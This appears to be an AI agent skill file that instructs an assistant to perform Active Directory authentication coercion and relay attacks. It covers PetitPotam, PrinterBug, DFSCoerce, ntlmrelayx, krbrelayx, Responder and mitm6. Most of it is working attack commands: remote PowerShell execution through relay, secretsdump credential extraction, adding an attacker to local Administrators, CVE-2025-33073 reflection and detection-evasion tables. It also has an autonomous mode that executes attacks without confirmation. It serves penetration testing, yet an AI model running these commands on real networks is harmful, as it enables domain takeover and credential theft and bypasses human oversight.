---
name: auth-coercion-relay
description: >
  Forces remote systems to authenticate back to attacker-controlled listeners
  and relays captured authentication to escalate privileges or move laterally.
  Covers authentication coercion (PetitPotam, PrinterBug, DFSCoerce,
  ShadowCoerce, CheeseOunce), NTLM relay (ntlmrelayx to LDAP/SMB/AD CS/MSSQL),
  Kerberos relay (krbrelayx, mitm6), and name resolution poisoning
  (LLMNR/NBNS/WPAD via Responder). Use when you need to escalate from
  domain user to local admin or domain admin via coercion+relay, capture
  NetNTLM hashes on the wire, perform NTLM relay attacks, set up IPv6
  DNS takeover, or exploit multicast name resolution. Triggers on: "petitpotam",
  "printerbug", "coercion", "ntlm relay", "ntlmrelayx", "responder",
  "LLMNR", "NBNS", "WPAD", "mitm6", "krbrelayx", "DFSCoerce",
  "ShadowCoerce", "relay to LDAP", "relay to ADCS", "ESC8",
  "hash capture", "authentication coercion", "forced authentication".
  OPSEC: high (coercion creates auth events, relay triggers signing
  violations, poisoning generates network anomalies). Tools: ntlmrelayx.py,
  krbrelayx.py, Responder, mitm6, PetitPotam, DFSCoerce, netexec.
  Do NOT use for certificate enrollment exploitation after relay — use
  **adcs-access-and-relay** (ESC8/ESC11). Do NOT use for exploiting
  captured hashes offline — use **kerberos-roasting** (cracking) or
  **pass-the-hash** (authentication).
---

# Authentication Coercion & Relay

You are helping a penetration tester force remote systems to authenticate
to attacker-controlled listeners and relay or capture those credentials for
privilege escalation and lateral movement. All testing is under explicit
written authorization.

**OPSEC exception — Kerberos-first does NOT apply**: Coercion and relay
attacks are inherently about manipulating authentication protocols (NTLM
or Kerberos) at the network layer. The Kerberos-first convention from
CLAUDE.md does not apply to the attack itself, though tool setup and
enumeration commands still use `-k -no-pass` where possible.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Explain each coercion method and relay target.
  Ask which combination to use. Warn about SMB signing and LDAP signing
  requirements before attempting relay.
- **Autonomous**: Check signing requirements, select the best
  coercion+relay path, execute, and report results.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically.

When an engagement directory exists:
- **Activity** -> `### [HH:MM] auth-coercion-relay -> <target>` with
  coercion method, relay target, outcome.
- **Findings** -> Log successful relay (machine account created, RBCD
  set, certificate obtained, code execution achieved).
- **Evidence** -> Save captured hashes to `engagement/evidence/relay-hashes.txt`,
  relay output to `engagement/evidence/relay-output.txt`.

## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Check for existing credentials that enable authenticated coercion
- Identify targets with SMB signing disabled or LDAP signing not enforced
- Avoid re-testing hosts already in the Blocked section
- Check if AD CS enrollment endpoints exist (for relay to ADCS path)

After completing, update `engagement/state.md`:
- **Credentials**: Add captured hashes, machine account credentials
- **Access**: Add new footholds from relay (RBCD, machine account, cert)
- **Pivot Map**: Coercion on X -> relay to Y -> access Z
- **Blocked**: Hosts where signing is enforced, coercion failed

## Prerequisites

- Domain user credentials (some coercion methods work unauthenticated)
- Network position: same VLAN as targets (for poisoning) or route to
  targets (for RPC coercion)
- Tools: `ntlmrelayx.py` (Impacket), `Responder`, `PetitPotam`,
  `DFSCoerce`, optionally `krbrelayx.py`, `mitm6`, `netexec`

**Kerberos-first workflow** (for enumeration and setup commands only):

```bash
getTGT.py DOMAIN/user@DC.DOMAIN.LOCAL -hashes :NTHASH
export KRB5CCNAME=user.ccache
# Enumeration commands below use -k -no-pass
```

## Step 1: Assess Relay Feasibility

Before coercing, check what relay targets are available.

### SMB Signing (Required for SMB Relay)

```bash
# Find hosts with SMB signing NOT required
nxc smb 10.10.10.0/24 --use-kcache --gen-relay-list relay-targets.txt

# Check specific hosts
nxc smb TARGET --use-kcache --signing
```

Signing status by OS (defaults):
| OS | SMB Signing | Notes |
|----|-------------|-------|
| Domain Controllers | Required | Always required |
| Server 2025 DC | Required | LDAP signing also required |
| Server 2022 23H2+ DC | Required | LDAP signing also required |
| Member servers 2019/2022 | **Not required** | Relay targets |
| Windows 10/11 pre-24H2 | **Not required** | Relay targets, WebClient installed |
| Windows 11 24H2+ | Required | New default |

### LDAP Signing (Required for LDAP Relay)

```bash
# Check LDAP signing (nxc or manual)
nxc ldap DC.DOMAIN.LOCAL --use-kcache -M ldap-checker

# Manual check via LDAP query
ldapsearch -H ldap://DC.DOMAIN.LOCAL -x -s base \
  -b "" "(objectClass=*)" supportedCapabilities
```

- **Pre-2025 DCs**: LDAP signing typically NOT required (relay works)
- **Server 2025 DCs**: LDAP signing required by default (relay blocked)
- LDAPS (port 636) requires channel binding — relay typically fails

### AD CS Enrollment (Required for Relay to ADCS)

```bash
# Find HTTP enrollment endpoints (vulnerable to relay)
nxc ldap DC.DOMAIN.LOCAL --use-kcache -M adcs
certipy find -k -no-pass -u user@DOMAIN.LOCAL -dc-ip DC_IP -stdout | grep "Web Enrollment"
```

If HTTP enrollment is enabled, NTLM relay to AD CS is viable (ESC8 path).

### WebClient Service (Enables HTTP-Based Coercion)

```bash
# Check WebClient status on targets (enables HTTP auth callback)
nxc smb 10.10.10.0/24 --use-kcache -M webdav
```

WebClient converts SMB UNC paths to HTTP, enabling coercion over HTTP
(which bypasses SMB signing requirements).

## Step 2: Choose Attack Path

| Scenario | Path | Go To |
|----------|------|-------|
| SMB signing disabled on targets | Coercion -> NTLM relay to SMB | Step 3 + Step 4A |
| LDAP signing not enforced on DC | Coercion -> NTLM relay to LDAP | Step 3 + Step 4B |
| AD CS HTTP enrollment available | Coercion -> NTLM relay to AD CS | Step 3 + Step 4C |
| WebClient enabled on target | HTTP coercion -> relay to LDAP | Step 3 + Step 4B |
| Kerberos relay viable | Coercion -> Kerberos relay to AD CS | Step 3 + Step 5 |
| No relay feasible | Capture hashes -> crack offline | Step 6 |
| On same VLAN, no creds | LLMNR/NBNS poisoning -> capture | Step 7 |

## Step 3: Authentication Coercion

Force a remote machine to authenticate back to your listener.

### Coercion Method Reference

| Method | Protocol | Pipe | Tool | Requires Auth | Notes |
|--------|----------|------|------|---------------|-------|
| PetitPotam | MS-EFSR | `\PIPE\efsrpc` / `\PIPE\lsarpc` | PetitPotam | No (unauthenticated on unpatched) | Most reliable for DCs |
| PrinterBug | MS-RPRN | `\PIPE\spoolss` | SpoolSample, printerbug.py | Yes | Requires Spooler running |
| DFSCoerce | MS-DFSNM | `\PIPE\netdfs` | DFSCoerce | Yes | Works on all DFS-enabled hosts |
| ShadowCoerce | MS-FSRVP | `\PIPE\FssagentRpc` | ShadowCoerce | Yes | VSS Agent service required |
| CheeseOunce | MS-EVEN | `\PIPE\even` | CheeseOunce | Yes | EventLog backup coercion |

### NetExec coerce_plus (Automated Discovery)

```bash
# Test all coercion methods at once
nxc smb TARGET --use-kcache -M coerce_plus

# Test specific method
nxc smb TARGET --use-kcache -M coerce_plus -o METHOD=PetitPotam
nxc smb TARGET --use-kcache -M coerce_plus -o METHOD=PrinterBug
nxc smb TARGET --use-kcache -M coerce_plus -o METHOD=DFSCoerce
```

### PetitPotam (MS-EFSR) — Most Reliable

```bash
# Unauthenticated (unpatched DCs only)
python3 PetitPotam.py LISTENER_IP TARGET_DC

# Authenticated (works on patched DCs via lsarpc pipe)
python3 PetitPotam.py -u user -p 'password' -d DOMAIN.LOCAL \
  LISTENER_IP TARGET_DC
```

### PrinterBug (MS-RPRN)

```bash
# Check if Spooler is running
rpcdump.py DOMAIN/user@TARGET -k -no-pass | grep MS-RPRN

# Trigger callback
python3 printerbug.py DOMAIN/user@TARGET LISTENER_IP -k -no-pass
# Windows: SpoolSample.exe TARGET LISTENER_IP
```

### DFSCoerce (MS-DFSNM)

```bash
python3 dfscoerce.py -u user -d DOMAIN.LOCAL LISTENER_IP TARGET
```

### ShadowCoerce (MS-FSRVP)

```bash
python3 shadowcoerce.py -u user -p password -d DOMAIN.LOCAL \
  LISTENER_IP TARGET
```

### MSSQL xp_dirtree (UNC Path Injection)

```bash
# If you have MSSQL access
EXEC xp_dirtree '\\LISTENER_IP\share', 1, 1
EXEC master.dbo.xp_fileexist '\\LISTENER_IP\share\file'
```

## Step 4: NTLM Relay

Relay captured NTLM authentication to a target service.

### Step 4A: Relay to SMB (Remote Code Execution)

Requires SMB signing **not required** on target.

```bash
# Start relay listener (target list from Step 1)
sudo ntlmrelayx.py -tf relay-targets.txt -smb2support

# With command execution
sudo ntlmrelayx.py -tf relay-targets.txt -smb2support \
  -c "powershell -e BASE64_PAYLOAD"

# Interactive SOCKS proxy (access multiple services through relay)
sudo ntlmrelayx.py -tf relay-targets.txt -smb2support -socks
# Then:
proxychains smbclient //TARGET/C$ -U DOMAIN/MACHINE$ -no-pass
proxychains secretsdump.py DOMAIN/MACHINE$@TARGET -no-pass
```

### Step 4B: Relay to LDAP (Machine Account / RBCD / ACL Abuse)

Requires LDAP signing **not enforced** on target DC. Relay over LDAPS
requires no channel binding.

```bash
# Create machine account via relay (uses MachineAccountQuota)
sudo ntlmrelayx.py -t ldaps://DC.DOMAIN.LOCAL --add-computer \
  FAKECOMPUTER$ Password123 -smb2support

# Set RBCD via relay (delegate from attacker machine to target)
sudo ntlmrelayx.py -t ldaps://DC.DOMAIN.LOCAL --delegate-access \
  -smb2support

# Escalate user via relay (add user to group, modify ACLs)
sudo ntlmrelayx.py -t ldaps://DC.DOMAIN.LOCAL \
  --escalate-user attacker_user -smb2support
```

After RBCD setup:
```bash
# Get service ticket via S4U
getST.py -spn cifs/TARGET.DOMAIN.LOCAL -impersonate Administrator \
  DOMAIN.LOCAL/FAKECOMPUTER$:Password123
export KRB5CCNAME=Administrator@cifs_TARGET.DOMAIN.LOCAL@DOMAIN.LOCAL.ccache
secretsdump.py DOMAIN/Administrator@TARGET.DOMAIN.LOCAL -k -no-pass
```

### Step 4C: Relay to AD CS (Certificate Enrollment)

Relay NTLM auth to AD CS HTTP enrollment to obtain a certificate.

```bash
# ntlmrelayx to AD CS
sudo ntlmrelayx.py -t http://CA.DOMAIN.LOCAL/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support

# certipy relay
certipy relay -target http://CA.DOMAIN.LOCAL/certsrv/certfnsh.asp \
  -template DomainController
```

After obtaining certificate, authenticate via PKINIT:
```bash
certipy auth -pfx dc.pfx -dc-ip DC_IP
# or
python3 gettgtpkinit.py -cert-pfx dc.pfx DOMAIN.LOCAL/DC$ dc.ccache
export KRB5CCNAME=dc.ccache
secretsdump.py DOMAIN/DC$@DC.DOMAIN.LOCAL -k -no-pass
```

For full AD CS relay exploitation (ESC8/ESC11), route to **adcs-access-and-relay**.

### Step 4D: Relay to MSSQL

```bash
# Relay to MSSQL for command execution
sudo ntlmrelayx.py -t mssql://SQL.DOMAIN.LOCAL -smb2support \
  -q "EXEC xp_cmdshell 'whoami'"

# Interactive MSSQL via SOCKS
sudo ntlmrelayx.py -t mssql://SQL.DOMAIN.LOCAL -smb2support -socks
proxychains mssqlclient.py DOMAIN/MACHINE$@SQL.DOMAIN.LOCAL \
  -windows-auth -no-pass
```

## Step 5: Kerberos Relay

Relay Kerberos authentication instead of NTLM — avoids NTLM signing
checks but limited to same-host relay (shares machine account key).

### Kerberos Relay to AD CS (via LLMNR + Responder)

```bash
# Start Responder (only poison, don't serve)
python3 Responder.py -I eth0 -N PKI_SERVER_NETBIOS

# Start krbrelayx targeting AD CS HTTP enrollment
sudo python3 krbrelayx.py \
  --target 'http://CA.DOMAIN.LOCAL/certsrv/' \
  -ip ATTACKER_IP --adcs --template Machine -debug
```

### Kerberos Relay to AD CS (via DNS + mitm6)

```bash
# Start krbrelayx
sudo krbrelayx.py \
  --target http://CA.DOMAIN.LOCAL/certsrv/ \
  -ip ATTACKER_IP --victim TARGET.DOMAIN.LOCAL \
  --adcs --template Machine

# Start mitm6 for IPv6 DNS takeover
sudo mitm6 --domain DOMAIN.LOCAL \
  --host-allowlist TARGET.DOMAIN.LOCAL \
  --relay CA.DOMAIN.LOCAL -v
```

After obtaining certificate:
```bash
python3 gettgtpkinit.py -pfx-base64 CERT_B64 \
  DOMAIN.LOCAL/TARGET$ target.ccache
export KRB5CCNAME=target.ccache
secretsdump.py DOMAIN/TARGET$@TARGET.DOMAIN.LOCAL -k -no-pass
```

### Kerberos Reflection (CVE-2025-33073)

Relay a machine's Kerberos auth back to itself via DNS record trick:

```bash
# Create special DNS record (authenticated)
dnstool.py -u 'DOMAIN.LOCAL\user' -p 'Password' DC_IP \
  -a add -r 'target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' \
  -d ATTACKER_IP

# Start krbrelayx for reflection
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Trigger coercion using the crafted hostname
petitpotam.py -d DOMAIN.LOCAL -u user -p 'Password' \
  'target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' \
  TARGET.DOMAIN.LOCAL
```

## Step 6: Hash Capture (Offline Cracking)

When relay is not feasible, capture and crack NetNTLM hashes.

### Responder (Capture Mode)

```bash
# Capture NetNTLMv2 hashes
sudo responder -I eth0 -wfrd -P -v

# Hashes saved to /usr/share/responder/logs/
```

### NTLMv1 Downgrade (When LmCompatibilityLevel Allows)

If `LmCompatibilityLevel <= 1` (send LM & NTLM response):

```bash
# Set challenge to known value for rainbow table lookup
# Edit Responder.conf: Challenge = 1122334455667788
sudo responder -I eth0 --lm --disable-ess

# Crack via shuck.sh (online, free with magic challenge)
# Or via hashcat with rainbow tables
hashcat -m 5500 captured_ntlmv1.txt -a 3  # NTLMv1
```

### Crack NetNTLMv2

```bash
# hashcat mode 5600
hashcat -m 5600 captured_ntlmv2.txt wordlist.txt -r rules/best64.rule

# john
john --format=netntlmv2 captured_ntlmv2.txt --wordlist=wordlist.txt
```

### Coercion for Hash Capture (Without Relay)

```bash
# Start Responder, then coerce
sudo responder -I eth0 -v
python3 PetitPotam.py ATTACKER_IP TARGET_DC
# Captured machine$ NetNTLM hash -> crack or relay
```

## Step 7: Name Resolution Poisoning (LLMNR/NBNS/WPAD)

Poison multicast name resolution to capture hashes from machines
requesting nonexistent hostnames.

### Responder (LLMNR + NBNS + WPAD)

```bash
# Full poisoning mode
sudo responder -I eth0 -wfrd -P -v

# Passive analysis first (see what's being requested)
sudo responder -I eth0 -A
```

### mitm6 (IPv6 DNS Takeover)

More stealthy than LLMNR poisoning — exploits IPv6 auto-configuration.

```bash
# IPv6 DNS takeover -> relay to LDAP
sudo mitm6 -i eth0 -d DOMAIN.LOCAL

# Combine with ntlmrelayx
sudo ntlmrelayx.py -6 -wh ATTACKER_IP \
  -t ldaps://DC.DOMAIN.LOCAL --add-computer -smb2support
```

### Inveigh (Windows Alternative)

```powershell
# PowerShell
Import-Module .\Inveigh.psd1
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y

# InveighZero (C# binary)
.\Inveigh.exe
```

## Step 8: Advanced Relay Techniques

### Drop the MIC (CVE-2019-1040)

Remove the MIC (Message Integrity Code) from NTLM relay to bypass
NTLM signing on the relay path:

```bash
# Remove MIC and escalate via LDAP
sudo ntlmrelayx.py --remove-mic --escalate-user attacker \
  -t ldap://DC.DOMAIN.LOCAL -smb2support

# Remove MIC and set RBCD
sudo ntlmrelayx.py -t ldaps://DC.DOMAIN.LOCAL --remove-mic \
  --delegate-access -smb2support
```

### Ghost Potato (CVE-2019-1384)

Local privilege escalation via NTLM relay with DCOM:

```bash
sudo ntlmrelayx.py -t ldaps://DC.DOMAIN.LOCAL \
  --gpotato-startup 'C:\Windows\System32\cmd.exe /c net localgroup Administrators attacker /add'
```

### NTLM Reflection (CVE-2025-33073)

Relay a machine's NTLM auth back to itself via DNS TXT record:

```bash
dnstool.py -u 'DOMAIN.LOCAL\user' -p 'Password' DC_IP \
  -a add -r 'target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' \
  -d ATTACKER_IP
ntlmrelayx.py -t smb://TARGET.DOMAIN.LOCAL -smb2support
```

## Step 9: Escalate or Pivot

After successful coercion and relay:
- **Machine account created via LDAP relay**: Use for RBCD attack chain.
  Route to **kerberos-delegation** (RBCD section).
- **RBCD set via relay**: Execute S4U chain to impersonate admin on
  target. Route to **kerberos-delegation**.
- **Certificate obtained via AD CS relay**: Authenticate via PKINIT.
  Route to **adcs-access-and-relay** for full ESC8/ESC11 exploitation.
- **NetNTLM hash captured**: Crack offline or relay to another service.
  Route to **pass-the-hash** for authentication with cracked hash.
- **Code execution on target**: Route to **credential-dumping** for
  SAM/LSASS extraction.
- **Domain admin hash captured via relay**: Route to **credential-dumping**
  (DCSync) for full domain compromise.

When routing, pass: captured credentials/certificates, relay method used,
target host, access level, and mode.

Update `engagement/state.md` with all captured credentials, new access,
and relay paths tested.

## Deep Reference

For additional relay techniques, coercion methods, and edge cases:

```
Read $RED_RUN_DOCS/public-security-references/docs/active-directory/internal-relay-ntlm.md
Read $RED_RUN_DOCS/public-security-references/docs/active-directory/internal-relay-kerberos.md
Read $RED_RUN_DOCS/public-security-references/docs/active-directory/internal-relay-coerce.md
Read $RED_RUN_DOCS/public-security-references/docs/active-directory/hash-capture.md
Read $RED_RUN_DOCS/public-security-references/src/windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
Read $RED_RUN_DOCS/public-security-references/src/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
```

## Troubleshooting

### Relay Fails with "LDAP Signing Required"

LDAP relay requires signing NOT enforced. Check:
```bash
nxc ldap DC.DOMAIN.LOCAL --use-kcache -M ldap-checker
```
If signing is required, relay to AD CS (HTTP) or SMB instead.

### Coercion Returns "Access Denied"

- PetitPotam unauthenticated was patched — use authenticated mode
- PrinterBug requires Spooler service running — check with rpcdump
- Try alternate coercion methods (DFSCoerce, ShadowCoerce)
- WebClient-based HTTP coercion may bypass SMB-level blocks

### ntlmrelayx Hangs or No Callback

- Verify listener IP is reachable from target network
- Check firewall allows inbound on port 445 (SMB) or 80/443 (HTTP)
- Stop local SMB service: `sudo systemctl stop smbd`
- Stop local HTTP service if relaying HTTP

### MachineAccountQuota is 0

Default `ms-DS-MachineAccountQuota` is 10. If set to 0:
- Cannot create machine accounts via relay
- Use `--delegate-access` instead (modifies existing object)
- Or relay to AD CS for certificate-based escalation

### OPSEC Comparison

| Technique | Network Artifacts | Detection Events | Risk |
|-----------|------------------|------------------|------|
| LLMNR/NBNS poisoning | Broadcast responses | Network anomaly | **HIGH** |
| mitm6 IPv6 DNS | DHCPv6 + DNS replies | Less monitored | **MEDIUM** |
| PetitPotam (authenticated) | RPC call + SMB callback | 4624 + 4776 | **MEDIUM** |
| PrinterBug | RPC + Spooler callback | 4624 + 4776 | **MEDIUM** |
| NTLM relay to SMB | SMB auth forwarding | 4624 type 3 | **HIGH** |
| NTLM relay to LDAP | LDAP bind forwarding | 4662 | **HIGH** |
| NTLM relay to AD CS | HTTP enrollment | Certificate issued | **MEDIUM** |
| Kerberos relay | Kerberos AP-REQ forward | 4769 | **LOW** |
